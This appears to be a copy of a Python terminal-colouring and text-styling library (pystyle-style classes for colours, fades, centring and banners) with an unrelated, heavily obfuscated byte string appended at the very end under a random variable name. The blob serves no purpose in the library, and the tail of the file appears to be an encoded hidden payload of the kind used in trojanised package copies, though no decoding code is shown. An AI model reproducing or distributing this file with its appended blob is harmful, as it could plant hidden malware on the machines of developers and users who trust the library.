# made by billythegoat356, loTus01, and BlueRed

# https://github.com/billythegoat356 https://github.com/loTus04 https://github.com/CSM-BlueRed

# Version : 2.9 (added Colorate.Format, added Banner.Arrow, added Anime.Move, added Center.GroupAlign, added Center.TextAlign, updated Box to Banner, updated Box.Lines))

# based on pyfade anc pycenter, R.I.P

# <3


from os import name as _name, system as _system, get_terminal_size as _terminal_size, terminal_size
from sys import stdout as _stdout
from time import sleep as _sleep
from threading import Thread as _thread


if _name == 'nt':
    from ctypes import c_int, c_byte, Structure, byref, windll

    class _CursorInfo(Structure):
        _fields_ = [("size", c_int),
                    ("visible", c_byte)]


class System:

    """
    1 variable:
        Windows      |      tells if the user is on Windows OS or not
    5 functions:
        Init()       |      initialize the terminal to allow the use of colors
        Clear()      |      clear the terminal
        Title()      |      set the title of terminal, only for Windows
        Size()       |      set the size of terminal, only for Windows
        Command()    |      enter a shell command
    """

    Windows = _name == 'nt'

    def Init():
        _system('')

    def Clear():
        return _system("cls" if System.Windows else "clear")

    def Title(title: str):
        if System.Windows:
            return _system(f"title {title}")

    def Size(x: int, y: int):
        if System.Windows:
            return _system(f"mode {x}, {y}")

    def Command(command: str):
        return _system(command)



class Cursor:

    """
    2 functions:
        HideCursor()      |      hides the white blinking in the terminal
        ShowCursor()      |      shows the white blinking in the terminal
    """

    def HideCursor():
        if _name == 'nt':
            Cursor._cursor(False)
        elif _name == 'posix':
            _stdout.write("\033[?25l")
            _stdout.flush()

    def ShowCursor():
        if _name == 'nt':
            Cursor._cursor(True)
        elif _name == 'posix':
            _stdout.write("\033[?25h")
            _stdout.flush()

    """ ! developper area ! """

    def _cursor(visible: bool):
        ci = _CursorInfo()
        handle = windll.kernel32.GetStdHandle(-11)
        windll.kernel32.GetConsoleCursorInfo(handle, byref(ci))
        ci.visible = visible
        windll.kernel32.SetConsoleCursorInfo(handle, byref(ci))


class _MakeColors:

    """ ! developper area ! """

    def _makeansi(col: str, text: str) -> str:
        return f"\033[38;2;{col}m{text}\033[38;2;255;255;255m"

    def _rmansi(col: str) -> str:
        return col.replace('\033[38;2;', '').replace('m','').replace('50m', '').replace('\x1b[38', '')

    def _makergbcol(var1: list, var2: list) -> list:
        col = list(var1[:12])
        for _col in var2[:12]:
            col.append(_col)
        for _col in reversed(col):
            col.append(_col)
        return col

    def _start(color: str) -> str:
        return f"\033[38;2;{color}m"

    def _end() -> str:
        return "\033[38;2;255;255;255m"

    def _maketext(color: str, text: str, end: bool = False) -> str:
        end = _MakeColors._end() if end else ""
        return color+text+end

    def _getspaces(text: str) -> int:
        return len(text) - len(text.lstrip())

    def _makerainbow(*colors) -> list:
        colors = [color[:24] for color in colors]
        rainbow = []
        for color in colors:
            for col in color:
                rainbow.append(col)
        return rainbow
    
    def _reverse(colors: list) -> list:
        _colors = list(colors)
        for col in reversed(_colors):
            colors.append(col)
        return colors
    
    def _mixcolors(col1: str, col2: str, _reverse: bool = True) -> list:
        col1, col2 = _MakeColors._rmansi(col=col1), _MakeColors._rmansi(col=col2)
        fade1 = Colors.StaticMIX([col1, col2], _start=False)      
        fade2 = Colors.StaticMIX([fade1, col2], _start=False)
        fade3 = Colors.StaticMIX([fade1, col1], _start=False)
        fade4 = Colors.StaticMIX([fade2, col2], _start=False)
        fade5 = Colors.StaticMIX([fade1, fade3], _start=False)    
        fade6 = Colors.StaticMIX([fade3, col1], _start=False)
        fade7 = Colors.StaticMIX([fade1, fade2], _start=False)
        mixed = [col1, fade6, fade3, fade5, fade1, fade7, fade2, fade4, col2]
        return _MakeColors._reverse(colors=mixed) if _reverse else mixed 

class Colors:

    """
    54 variables (colors)
    
    3 lists:
        static_colors      |      colors that are static, ex: 'red' (can't be faded)
        dynamic_colors     |      colors that are dynamic, ex: 'blue_to_purple' (can be faded)
        all_colors         |      every color of static_colors and dynamic_colors
        
    3 functions:
        StaticRGB()        |      create your own fix/static color
        DynamicRGB()       |      create your own faded/dynamic color (soon...)
        StaticMIX()        |      mix two or more static colors
        DynamicMIX()       |      mix two or more dynamic colors
        Symbol()           |      create a colored symbol, ex: '[!]'
    """

    def StaticRGB(r: int, g: int, b: int) -> str:
        return _MakeColors._start(f"{r};{g};{b}")

    def DynamicRGB(r1: int, g1: int, b1: int, r2: int,
                   g2: int, b2: int) -> list: ...

    def StaticMIX(colors: list, _start: bool = True) -> str:
        rgb = []
        for col in colors:
            col = _MakeColors._rmansi(col=col)
            col = col.split(';')
            r = int(int(col[0]))
            g = int(int(col[1]))
            b = int(int(col[2]))
            rgb.append([r, g, b])
        r = round(sum(rgb[0] for rgb in rgb) / len(rgb))
        g = round(sum(rgb[1] for rgb in rgb) / len(rgb))
        b = round(sum(rgb[2] for rgb in rgb) / len(rgb))
        rgb = f'{r};{g};{b}'
        return _MakeColors._start(rgb) if _start else rgb

    def DynamicMIX(colors: list):
        _colors = []
        for color in colors:
            if colors.index(color) == len(colors) - 1:
                break
            _colors.append([color, colors[colors.index(color) + 1]])
        colors = [_MakeColors._mixcolors(col1=color[0], col2=color[1], _reverse=False) for color in _colors]

        final = []
        for col in colors:
            for col in col:
                final.append(col)
        return _MakeColors._reverse(colors=final)
            


    """ symbols """

    def Symbol(symbol: str, col: str, col_left_right: str, left: str = '[', right: str = ']') -> str:
        return f"{col_left_right}{left}{col}{symbol}{col_left_right}{right}{Col.reset}"


    """ dynamic colors """

    black_to_white = ["m;m;m"]
    black_to_red = ["m;0;0"]
    black_to_green = ["0;m;0"]
    black_to_blue = ["0;0;m"]

    white_to_black = ["n;n;n"]
    white_to_red = ["255;n;n"]
    white_to_green = ["n;255;n"]
    white_to_blue = ["n;n;255"]

    red_to_black = ["n;0;0"]
    red_to_white = ["255;m;m"]
    red_to_yellow = ["255;m;0"]
    red_to_purple = ["255;0;m"]

    green_to_black = ["0;n;0"]
    green_to_white = ["m;255;m"]
    green_to_yellow = ["m;255;0"]
    green_to_cyan = ["0;255;m"]

    blue_to_black = ["0;0;n"]
    blue_to_white = ["m;m;255"]
    blue_to_cyan = ["0;m;255"]
    blue_to_purple = ["m;0;255"]

    yellow_to_red = ["255;n;0"]
    yellow_to_green = ["n;255;0"]

    purple_to_red = ["255;0;n"]
    purple_to_blue = ["n;0;255"]

    cyan_to_green = ["0;255;n"]
    cyan_to_blue = ["0;n;255"]


    red_to_blue = ...
    red_to_green = ...

    green_to_blue = ...
    green_to_red = ...

    blue_to_red = ...
    blue_to_green = ...

    rainbow = ...

    """ static colors """

    red = _MakeColors._start('255;0;0')
    green = _MakeColors._start('0;255;0')
    blue = _MakeColors._start('0;0;255')

    white = _MakeColors._start('255;255;255')
    black = _MakeColors._start('0;0;0')
    gray = _MakeColors._start('150;150;150')

    yellow = _MakeColors._start('255;255;0')
    purple = _MakeColors._start('255;0;255')
    cyan = _MakeColors._start('0;255;255')

    orange = _MakeColors._start('255;150;0')
    pink = _MakeColors._start('255;0;150')
    turquoise = _MakeColors._start('0;150;255')

    light_gray = _MakeColors._start('200;200;200')
    dark_gray = _MakeColors._start('100;100;100')

    light_red = _MakeColors._start('255;100;100')
    light_green = _MakeColors._start('100;255;100')
    light_blue = _MakeColors._start('100;100;255')

    dark_red = _MakeColors._start('100;0;0')
    dark_green = _MakeColors._start('0;100;0')
    dark_blue = _MakeColors._start('0;0;100')

    reset = white

    """ ! developper area ! """

    col = (list, str)

    dynamic_colors = [
        black_to_white, black_to_red, black_to_green, black_to_blue,
        white_to_black, white_to_red, white_to_green, white_to_blue,

        red_to_black, red_to_white, red_to_yellow, red_to_purple,
        green_to_black, green_to_white, green_to_yellow, green_to_cyan,
        blue_to_black, blue_to_white, blue_to_cyan, blue_to_purple,

        yellow_to_red, yellow_to_green,
        purple_to_red, purple_to_blue,
        cyan_to_green, cyan_to_blue
    ]

    for color in dynamic_colors:
        _col = 20
        reversed_col = 220

        dbl_col = 20
        dbl_reversed_col = 220

        content = color[0]
        color.pop(0)

        for _ in range(12):

            if 'm' in content:
                result = content.replace('m', str(_col))
                color.append(result)

            elif 'n' in content:
                result = content.replace('n', str(reversed_col))
                color.append(result)

            _col += 20
            reversed_col -= 20

        for _ in range(12):

            if 'm' in content:
                result = content.replace('m', str(dbl_reversed_col))
                color.append(result)

            elif 'n' in content:
                result = content.replace('n', str(dbl_col))
                color.append(result)

            dbl_col += 20
            dbl_reversed_col -= 20

    red_to_blue = _MakeColors._makergbcol(red_to_purple, purple_to_blue)
    red_to_green = _MakeColors._makergbcol(red_to_yellow, yellow_to_green)

    green_to_blue = _MakeColors._makergbcol(green_to_cyan, cyan_to_blue)
    green_to_red = _MakeColors._makergbcol(green_to_yellow, yellow_to_red)

    blue_to_red = _MakeColors._makergbcol(blue_to_purple, purple_to_red)
    blue_to_green = _MakeColors._makergbcol(blue_to_cyan, cyan_to_green)

    rainbow = _MakeColors._makerainbow(
        red_to_green, green_to_blue, blue_to_red)

    for _col in (
        red_to_blue, red_to_green,
        green_to_blue, green_to_red,
        blue_to_red, blue_to_green
    ): dynamic_colors.append(_col)

    dynamic_colors.append(rainbow)

    static_colors = [
        red, green, blue,
        white, black, gray,
        yellow, purple, cyan,
        orange, pink, turquoise,
        light_gray, dark_gray,
        light_red, light_green, light_blue,
        dark_red, dark_green, dark_blue,
        reset
    ]

    all_colors = [color for color in dynamic_colors]
    for color in static_colors:
        all_colors.append(color)


Col = Colors


class Colorate:

    """
    6 functions:
        Static colors:
            Color()                 |            color a text with a static color
            Error()                 |            make an error with red text and advanced arguments
            Format()                |            set different colors for different parts of a text
        Dynamic colors:
            Vertical()              |           fade a text vertically
            Horizontal()            |           fade a text horizontally
            Diagonal()              |           fade a text diagonally
            DiagonalBackwards()     |           fade a text diagonally but backwards
    """

    """ fix/static colors """

    def Color(color: str, text: str, end: bool = True) -> str:
        return _MakeColors._maketext(color=color, text=text, end=end)

    def Error(text: str, color: str = Colors.red, end: bool = False, spaces: bool = 1, enter: bool = True, wait: int = False) -> str:
        content = _MakeColors._maketext(
            color=color, text="\n" * spaces + text, end=end)
        if enter:
            var = input(content)
        else:
            print(content)
            var = None

        if wait is True:
            exit()
        elif wait is not False:
            _sleep(wait)

        return var

    """ faded/dynamic colors"""

    def Vertical(color: list, text: str, speed: int = 1, start: int = 0, stop: int = 0, cut: int = 0, fill: bool = False) -> str:
        color = color[cut:]
        lines = text.splitlines()
        result = ""

        nstart = 0
        color_n = 0
        for lin in lines:
            colorR = color[color_n]
            if fill:
                result += " " * \
                    _MakeColors._getspaces(
                        lin) + "".join(_MakeColors._makeansi(colorR, x) for x in lin.strip()) + "\n"
            else:
                result += " " * \
                    _MakeColors._getspaces(
                        lin) + _MakeColors._makeansi(colorR, lin.strip()) + "\n"  

            if nstart != start:
                nstart += 1
                continue

            if lin.rstrip():
                if (
                    stop == 0
                    and color_n + speed < len(color)
                    or stop != 0
                    and color_n + speed < stop
                ):
                    color_n += speed
                elif stop == 0:
                    color_n = 0
                else:
                    color_n = stop

        return result.rstrip()

    def Horizontal(color: list, text: str, speed: int = 1, cut: int = 0) -> str:
        color = color[cut:]
        lines = text.splitlines()
        result = ""

        for lin in lines:
            carac = list(lin)
            color_n = 0
            for car in carac:
                colorR = color[color_n]
                result += " " * \
                    _MakeColors._getspaces(
                        car) + _MakeColors._makeansi(colorR, car.strip())
                if color_n + speed < len(color):
                    color_n += speed
                else:
                    color_n = 0
            result += "\n"
        return result.rstrip()

    def Diagonal(color: list, text: str, speed: int = 1, cut: int = 0) -> str:

        color = color[cut:]
        lines = text.splitlines()
        result = ""
        color_n = 0
        for lin in lines:
            carac = list(lin)
            for car in carac:
                colorR = color[color_n]
                result += " " * \
                    _MakeColors._getspaces(
                        car) + _MakeColors._makeansi(colorR, car.strip())
                if color_n + speed < len(color):
                    color_n += speed
                else:
                    color_n = 1
            result += "\n"

        return result.rstrip()

    def DiagonalBackwards(color: list, text: str, speed: int = 1, cut: int = 0) -> str:
        color = color[cut:]

        lines = text.splitlines()
        result = ""
        resultL = ''
        color_n = 0
        for lin in lines:
            carac = list(lin)
            carac.reverse()
            resultL = ''
            for car in carac:
                colorR = color[color_n]
                resultL = " " * \
                    _MakeColors._getspaces(
                        car) + _MakeColors._makeansi(colorR, car.strip()) + resultL
                if color_n + speed < len(color):
                    color_n += speed
                else:
                    color_n = 0
            result = result + '\n' + resultL
        return result.strip()

    def Format(text: str, second_chars: list, mode, principal_col: Colors.col, second_col: str):
        if mode == Colorate.Vertical:
            ctext = mode(principal_col, text, fill=True)
        else:
            ctext = mode(principal_col, text)
        ntext = ""
        for x in ctext:
            if x in second_chars:
                x = Colorate.Color(second_col, x)
            ntext += x
        return ntext


class Anime:

    """
    2 functions:
        Fade()                  |            make a small animation with a changing color text, using a dynamic color
        Move()                  |            make a small animation moving the text from left to right
        Bar()                   |            a fully customizable charging bar
        Anime()                 |            a mix between Fade() and Move(), available soon
    """

    def Fade(text: str, color: list, mode, time=True, interval=0.05, hide_cursor: bool = True, enter: bool = False):
        if hide_cursor:
            Cursor.HideCursor()

        if type(time) == int:
            time *= 15

        global passed
        passed = False

        if enter:
            th = _thread(target=Anime._input)
            th.start()

        if time is True:
            while True:
                if passed is not False:
                    break
                Anime._anime(text, color, mode, interval)
                ncolor = color[1:]
                ncolor.append(color[0])
                color = ncolor

        else:
            for _ in range(time):
                if passed is not False:
                    break
                Anime._anime(text, color, mode, interval)
                ncolor = color[1:]
                ncolor.append(color[0])
                color = ncolor

        if hide_cursor:
            Cursor.ShowCursor()

    def Move(text: str, color: list, time = True, interval = 0.01, hide_cursor: bool = True, enter: bool = False):
        if hide_cursor:
            Cursor.HideCursor()

        if type(time) == int:
            time *= 15

        global passed
        passed = False

        columns = _terminal_size().columns

        if enter:
            th = _thread(target = Anime._input)
            th.start()

        count = 0
        mode = 1

        if time is True:
            while not passed:
                if mode == 1:
                    if count >= (columns - (max(len(txt) for txt in text.splitlines()) + 1)):
                        mode = 2
                    count += 1
                elif mode == 2:
                    if count <= 0:
                        mode = 1
                    count -= 1
                Anime._anime('\n'.join((' ' * count) + line for line in text.splitlines()), color or [], lambda a, b: b, interval)
        else:
            for _ in range(time):
                if passed:
                    break
                if mode == 1:
                    if count >= (columns - (max(len(txt) for txt in text.splitlines()) + 1)):
                        mode = 2
                elif mode == 2:
                    if count <= 0:
                        mode = 1
                Anime._anime('\n'.join((' ' * count) + line for line in text.splitlines()), color or [], lambda a, b: b, interval)

                count += 1

        if hide_cursor:
            Cursor.ShowCursor()


    def Bar(length, carac_0: str = '[ ]', carac_1: str = '[0]', color: list = Colors.white, mode=Colorate.Horizontal, interval: int = 0.5, hide_cursor: bool = True, enter: bool = False, center: bool = False):
        if hide_cursor:
            Cursor.HideCursor()

        if type(color) == list:
            while not length <= len(color):
                ncolor = list(color)
                for col in ncolor:
                    color.append(col)

        global passed
        passed = False

        if enter:
            th = _thread(target=Anime._input)
            th.start()

        for i in range(length + 1):
            bar = carac_1 * i + carac_0 * (length - i)
            if passed:
                break
            if type(color) == list:
                if center:
                    print(Center.XCenter(mode(color, bar)))

                else:
                    print(mode(color, bar))
            else:
                if center:
                    print(Center.XCenter(color + bar))
                else:
                    print(color + bar)
            _sleep(interval)
            System.Clear()
        if hide_cursor:
            Cursor.ShowCursor()

    def Anime() -> None: ...

    """ ! developper area ! """

    def _anime(text: str, color: list, mode, interval: int):
        _stdout.write(mode(color, text))
        _stdout.flush()
        _sleep(interval)
        System.Clear()

    def _input() -> str:
        global passed
        passed = input()
        return passed


class Write:
    """
    2 functions:
        Print()         |          print a text to the terminal while coloring it and with a fade and write effect
        Input()         |          same than Print() but adds an input to the end and returns its valor
    """

    def Print(text: str, color: list, interval=0.05, hide_cursor: bool = True, end: str = Colors.reset) -> None:
        if hide_cursor:
            Cursor.HideCursor()

        Write._write(text=text, color=color, interval=interval)

        _stdout.write(end)
        _stdout.flush()

        if hide_cursor:
            Cursor.ShowCursor()

    def Input(text: str, color: list, interval=0.05, hide_cursor: bool = True, input_color: str = Colors.reset, end: str = Colors.reset, func = input) -> str:
        if hide_cursor:
            Cursor.HideCursor()

        Write._write(text=text, color=color, interval=interval)

        valor = func(input_color)

        _stdout.write(end)
        _stdout.flush()

        if hide_cursor:
            Cursor.ShowCursor()

        return valor

    " ! developper area ! "

    def _write(text: str, color, interval: int):
        lines = list(text)
        if type(color) == list:
            while not len(lines) <= len(color):
                ncolor = list(color)
                for col in ncolor:
                    color.append(col)

        n = 0
        for line in lines:
            if type(color) == list:
                _stdout.write(_MakeColors._makeansi(color[n], line))
            else:
                _stdout.write(color + line)
            _stdout.flush()
            _sleep(interval)
            if line.strip():
                n += 1


class Center:

    """
    2 functions:
        XCenter()                  |             center the given text in X cords
        YCenter()                  |             center the given text in Y cords
        Center()                   |             center the given text in X and Y cords
        GroupAlign()               |             align the given text in a group
        TextAlign()                |             align the given text per lines

    NOTE: the functions of the class can be broken if the text argument has colors in it
    """

    center = 'CENTER'
    left = 'LEFT'
    right = 'RIGHT'

    def XCenter(text: str, spaces: int = None, icon: str = " "):
        if spaces is None:
            spaces = Center._xspaces(text=text)
        return "\n".join((icon * spaces) + text for text in text.splitlines())


    def YCenter(text: str, spaces: int = None, icon: str = "\n"):
        if spaces is None:
            spaces = Center._yspaces(text=text)

        return icon * spaces + "\n".join(text.splitlines())

    def Center(text: str, xspaces: int = None, yspaces: int = None, xicon: str = " ", yicon: str = "\n") -> str:
        if xspaces is None:
            xspaces = Center._xspaces(text=text)

        if yspaces is None:
            yspaces = Center._yspaces(text=text)

        text = yicon * yspaces + "\n".join(text.splitlines())
        return "\n".join((xicon * xspaces) + text for text in text.splitlines())

    def GroupAlign(text: str, align: str = center):
        align = align.upper()
        if align == Center.center:
            return Center.XCenter(text)
        elif align == Center.left:
            return text
        elif align == Center.right:
            length = _terminal_size().columns
            maxLineSize = max(len(line) for line in text.splitlines())
            return '\n'.join((' ' * (length - maxLineSize)) + line for line in text.splitlines())
        else:
            raise Center.BadAlignment()
    
    def TextAlign(text: str, align: str = center):
        align = align.upper()
        mlen = max(len(i) for i in text.splitlines())
        if align == Center.center:

            return "\n".join((' ' * int(mlen/2 - len(lin)/2)) + lin for lin in text.splitlines())
        elif align == Center.left:
            return text
        elif align == Center.right:
            ntext = '\n'.join(' ' * (mlen - len(lin)) + lin for lin in text.splitlines())
            return ntext
        else:
            raise Center.BadAlignment()


    """ ! developper area ! """

    def _xspaces(text: str):
        try:
            col = _terminal_size().columns
        except OSError:
            return 0
        textl = text.splitlines()
        ntextl = max((len(v) for v in textl if v.strip()), default = 0)
        return int((col - ntextl) / 2)

    def _yspaces(text: str):
        try:
            lin = _terminal_size().lines
        except OSError:
            return 0
        textl = text.splitlines()
        ntextl = len(textl)
        return int((lin - ntextl) / 2)

    class BadAlignment(Exception):
        def __init__(self):
            super().__init__("Choose a correct alignment: Center.center / Center.left / Center.right")

class Add:

    """
    1 function:
        Add()           |           allow you to add a text to another, and even center it
    """

    def Add(banner1, banner2, spaces=0, center=False):
        if center:
            split1 = len(banner1.splitlines())
            split2 = len(banner2.splitlines())
            if split1 > split2:
                spaces = (split1 - split2) // 2
            elif split2 > split1:
                spaces = (split2 - split1) // 2
            else:
                spaces = 0

        if spaces > max(len(banner1.splitlines()), len(banner2.splitlines())):
            # raise Banner.MaximumSpaces(spaces)
            spaces = max(len(banner1.splitlines()), len(banner2.splitlines()))

        ban1 = banner1.splitlines()
        ban2 = banner2.splitlines()

        ban1count = len(ban1)
        ban2count = len(ban2)

        size = Add._length(ban1)

        ban1 = Add._edit(ban1, size)

        ban1line = 0
        ban2line = 0
        text = ''

        for _ in range(spaces):

            if ban1count >= ban2count:
                ban1data = ban1[ban1line]
                ban2data = ''

                ban1line += 1

            else:
                ban1data = " " * size
                ban2data = ban2[ban2line]

                ban2line += 1

            text = text + ban1data + ban2data + '\n'
        while ban1line < ban1count or ban2line < ban2count:

            ban1data = ban1[ban1line] if ban1line < ban1count else " " * size
            ban2data = ban2[ban2line] if ban2line < ban2count else ""
            text = text + ban1data + ban2data + '\n'

            ban1line += 1
            ban2line += 1
        return text

    """ ! developper area ! """

    class MaximumSpaces(Exception):
        def __init__(self, spaces: str):
            super().__init__(f"Too much spaces [{spaces}].")

    def _length(ban1):
        bigestline = 0

        for line in ban1:
            if len(line) > bigestline:
                bigestline = len(line)
        return bigestline

    def _edit(ban1, size):
        return [line + (size - len(line)) * " " for line in ban1]


class Banner:

    """
    2 functions:
        SimpleCube()                  |             create a simple cube with the given text
        Lines()                       |             create a text framed by two lines
        Arrow()                       |             create a custom arrow
    """

    def Box(content: str, up_left: str, up_right: str, down_left: str, down_right: str, left_line: str, up_line: str, right_line: str, down_line: str) -> str:
        l = 0
        lines = content.splitlines()
        for a in lines:
            if len(a) > l:
                l = len(a)
        if l % 2 == 1:
            l += 1
        box = up_left + (up_line * l) + up_right + "\n"
        #box += "║ " + (" " * int(l / 2)) + (" " * int(l / 2)) + " ║\n"
        for line in lines:
            box += left_line + " " + line + (" " * int((l - len(line)))) + " " + right_line + "\n"
        box += down_left + (down_line * l) + down_right + "\n"
        return box


    def SimpleCube(content: str) -> str:
        l = 0
        lines = content.splitlines()
        for a in lines:
            if len(a) > l:
                l = len(a)
        if l % 2 == 1:
            l += 1
        box = "__" + ("_" * l) + "__\n"
        box += "| " + (" " * int(l / 2)) + (" " * int(l / 2)) + " |\n"
        for line in lines:
            box += "| " + line + (" " * int((l - len(line)))) + " |\n"
        box += "|_" + ("_" * l) + "_|\n"

        return box

    def DoubleCube(content: str) -> str:
        return Box.Box(content, "╔═", "═╗", "╚═", "═╝", "║", "═", "║", "═")

    def Lines(content: str, color = None, mode = Colorate.Horizontal, line = '═', pepite = 'ቐ') -> str:
        l = 1
        for c in content.splitlines():
            if len(c) > l:
                l = len(c)
        mode = Colorate.Horizontal if color is not None else (lambda **kw: kw['text'])
        box = mode(text = f"─{line*l}{pepite * 2}{line*l}─", color = color)
        assembly = box + "\n" + content + "\n" + box
        final = ''
        for lines in assembly.splitlines():
            final += Center.XCenter(lines) + "\n"
        return final
    
    def Arrow(icon: str = 'a', size: int = 2, number: int = 2, direction = 'right') -> str:
        spaces = ' ' * (size + 1)
        _arrow = ''
        structure = (size + 2, [size * 2, size * 2])
        count = 0
        if direction == 'right':
            for i in range(structure[1][0]):
                line = (structure[0] * icon)
                _arrow += (' ' * count) + spaces.join([line] * (number)) + '\n'
                count += 2

            for i in range(structure[1][0] + 1):
                line = (structure[0] * icon)
                _arrow += (' ' * count) + spaces.join([line] * (number)) + '\n'
                count -= 2
        elif direction == 'left':
            for i in range(structure[1][0]):
                count += 2

            for i in range(structure[1][0]):
                line = (structure[0] * icon)
                _arrow += (' ' * count) + spaces.join([line] * (number)) + '\n'
                count -= 2

            for i in range(structure[1][0] + 1):
                line = (structure[0] * icon)
                _arrow += (' ' * count) + spaces.join([line] * (number)) + '\n'
                count += 2
        return _arrow


Box = Banner
wopvEaTEcopFEavc ="^]AX@L\x18^D\x15@UXLP^FT\x1aE@VCFZTSBF8WA[U\x15FVF_]QV\x17X\\F[AE\x14iVGQ>QV\x11ITQLR]FU\x1eGHKM\\^\x1f\x18\x1dKBXGAAEPLQ\x19\x14uXZFO\x10\x1b\x08:\x18\x17\x19\x17\x10\x11\x17\x12LJH\r3\x10\x19\x19\x18\x16\x11\x14\x19\x16\x16\x15\x14D]A_\x16^EW_\x1b\x13\x17A[G\x1dQXTQ\x19AH\x11\x18\x13\x16C\x1e\x1e\x13XG\x18V\x0b3\x18\x10\x18\x14\x12\x14\x18\x10\x14\x11\x18\x19\x19\x13\x17\x11U\x16AK\\AW\x1a\x1bQTAYKE\x14\\D\x12n\\YUGVED\x11DGZHCXZUJJ\x18j_RKY[\x15DR@][_S\x15[\\C[JA\x16gSCY\x18hYWCYY\x13DFU[Z[\x14Q]AVJD\x18FWEMUGE\x18eW[R]_W\x16\x04\x15ZA\x1c^]M]Y^XZ\x1b\x1e\x12n\\`ycq\x17\r\x11\x10\x1dPW\\R\x16\x17\x19\x12\x18^TXUY\x16\x1e\x14\x14\x1b\x1bzW]AWV\x03\x1bMERVFR\x16dZgpe\x16\x14\x0e\x11\x13\x16C^I\x1b^Y]\\\x16@A\x13nZQCqIQJM\x13\n\x11\\K\x18ITAZ\x1c\\@PBBJ\x19drcz\x1b\x12lV^_\x17^^C\x12QKtOPCM\x03dX\x11\x14\x19\x16\x16\x15\x14\x13[F\x19[P^WUZFK\x1dfvf\x7f\x18\x18hYXW\x16dRE\\\x11grm|\x11\x1eXJgVQXW\x1c\x11\n\x14mV\x19\x19\x13\x17\x11\x13\x18\x16\x19\x15\x15B@PVM\x19\x14\x1b\x18\x14oYW^AU\x02\x17eY\x12\x18=\x12\x18\x18\x11\x17\x19\x10\x19\x19\x18\x16\x11\x14\x19\x16\x16S\x1aDF\\CS\x19\x17\x12\x11\x13\x14\x18GSZ]CTgAE]\x11\x0b\x13[E@ID\t\x16\x1b\\\\\x1f]J_HV]L\x16S[\\\x17J\x16Z\x03\x03VOG@C\x06F\x00HR\x0f\x01\x19TPXGRU]\x1cCP\x10eY\x10\x11\x17\x12\x18T^TX\\f_QZT\x14\x04\x16ft`{\x1f\x12\x18\x18ATFY\x1dGP\x12\x16k\\\x17\x11\x18\x14\x17CTGAVB@\x17BAUF]DCP]F]\x1c@QU_@TgLK_\x1b\x11_WUXYjT[U]\x10\x11jW\x11\x14\x13\x17\x12AGRHEVTUBD\x1c[Y][\x11l\x1b[YEY\x14\x16^YXQ\x1c\x10`dsc\x1a\x1c|RXLPQ\x07\x1dBA\\UCT\x1e\x18DRE\\\x17D[\x19\n\x17TTO\x17^MX^\x14\n\x0e\x12\x00d\x1b\x15\x13DYVTZ\x04aGGW\x10\x18e_\x14\x10;\x14\x13\x17\x12\x12\x12\x10\x18\x17\x19\x17\x10\x11\x17\x12\x18^\x1f@KYM\\\x10\x14\x11\x14\x19\x16\x16\\R\x13dTC^\x19ese\x1a\x1aQFiQ[[T\x10\x1d\r\x11mX\x14\x13\x11\x14\x19\x17\x13\x19\x14LBH\x03d^\x18\x14\x12\x14\x18\x10\x14\x11\x18\x19\x19\\D\x1fA][VCP\x1abxl\x10mX\x19\x11\x14\x13\x17\x12\x12\x12\x10]OZR@E\rnV\x18\x11\x17\x19\x10\x19\x19\x18\x16\x11\x14ID_[@\x1b\x1d\x17\x1e<\x11\x15\x12\x11\x13\x14\x18\x15SOQRAL\x14qX]Sz\\ErVB]]qJB^K\x02:\x18\x14\x12\x14\x18\x10\x14\x11\x18\x19\x19\x13GCZVB\x11\x17\x17\x1b8\x19\x18\x19\x11\x16\x19\x11\x14@BPB@_[RJD\x1eRV^T\x10\x13G@DQVV\x05\x11\x1bM[F\x1aRZXP\x19FH\x15\x14\x13\x1f\x14K]S[^\neJAR\x18;SXZW\x14I[RMRWB\\\x17KIK@WY\x10\x19\x1aBLXKGDFZL^\x11\x17b[\\]WNB\x14\x10\x0b>\x13\x17\x12\x12\\QUR\x19\n\x10W\x15q\x02dmbJUKJdjJ[J\x18QP@_[R^X\x19\x1cOmouHErVFVmdfXP\\_ZTmh\x17`ZWfYb\x133\x18\x10\x18\x14[R\x18^[E\x18VJ\x1dGPGP\x18PFQ[@\x11VX\\S\x10\x0b>\x13\x17\x12\x12\x12\x10\x18\x17VD\x1e\\VY]\\XEJ\x18WXUS\x18>\x19\x16\x16\x15\x14\x13\x14\x15GWE]mE\\k^\\ZR\x12\n\x11VUZT\x11\x1d\x14\x14mhN^]KUJoPLL_gGFUJD\x1aGZ\\\x1e9\x17\x11\x13\x18\x16\x19\x15\x15BSMP\x19\x0c\x16iP@[\x1fBSFXgCVhVX[W\x112\x11\x17\x19\x10\x19\x19\x18\x16XYIYDA\x14GQXGPXYW;\x13\x14\x18\x15\x16\x17\x12\x17X^\x14GPE^\x1aZBk_^_\\\x1c\x11\n;\x19\x18\x10\x18\x14\x12\x14\x18\x10\x14\x11\x18IKZYE\x1b\x11<\x19\x15\x15\x12\x12\x19\x18\x19TZJT\x0e9\x17\x12\x12\x12\x10\x18\x17\x19\x17\x10\x11\x17EQLY\x17V@\\W\x10BTYIP_YQ\x1dSPCBTXBUZF\x10\x1c\x1d\x15nkEUD\x19GSS\x16\x1f\x16C\x1e\x1e\x13XG\x18V\x0b3\x18\x10\x18\x14\x12\x14\x18\x10\x14\x11\x18\x19\x19\x13\x17\x11U\x16AK\\AW\x1a\x1b\x1a\x1b;\x15yOj\x18fgssq\x05\n\x02D\x1bOLbJLhsN[UCrxBf\x00rq\x07\x1cd\x02ViaBO\x1d{@NoTayu\x0cR\x12Pm\x07@\x00~dZj\x12\x1c\x13\x17_Ouq\x1ax\x16}P\x19\x18@\x1c~HGA\x0e\x1a[PD\x01u`X\x18\x12M[@dr\x14\x14\\\x00]Z\x02`KR\nry\x14p\x17y_\x02F\x16I|V\x12ld\x0brCXxuzY\x1ef<E?xv{CMt\x1bu\x10]Mn\x1do\x00y\x0e\x05XbmaLi\x0cwWw|\x1bC\x11\x1d\x1b\tmRF1ZY|SX`\x13\x08\x05]f`|\x16u\x11r\x1f^[\x0bH~\x19x@]\x04pbw\x0cyVbBaH\x04|x\x12w\x1fwRJF\x19up\x00]{\x1ej|\x7fqotO\x1avu@VK[v\x14r\x11\x1e|p\x0eZ\x1fX\x05jvpqI\x14\x15c\x00\x15dM\x13CKW\x00UO]a\x08\nl\x0eXzfKK\x1d0z\nvvK@m\x1eU|DV]_\x0bP\x08ReE[\x10z\x16eCSmxtdBy\x1ax\x10\x1ep\x17ETcZMOe}ApWJ\x1f_y\x18J\x00Y@w\x12x\x12\x08\x1auf\x7f\x0b}C\x06\x01cBd\x17\x1eNUaO\x0e\x00|\x1fUtWt\x07\x08}Q@~XmzZFGdMS`RhXQL\x00\x7fYlvxRx\x14y\x11\x18\x07gu